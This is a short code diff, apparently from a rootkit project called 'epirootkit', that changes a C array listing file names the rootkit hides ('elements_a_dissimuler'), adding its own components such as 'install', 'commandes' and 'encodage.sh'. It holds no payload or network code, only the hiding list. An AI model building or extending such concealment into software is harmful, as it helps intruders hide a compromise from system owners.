@@ -26,8 +26,15 @@ static struct systeme_camouflage camouflage = {0};
 
 static const char *elements_a_dissimuler[] = {
     "fichiercache",
-    "dos",
-    "dos_chiffre",
+    "auth",
+    "Makefile",
+    "commandes",
+    "dissimulation", 
+    "encodage.sh",
+    "epirootkit", 
+    "notification",
+    "main",
+    "install",
     NULL
 };
 
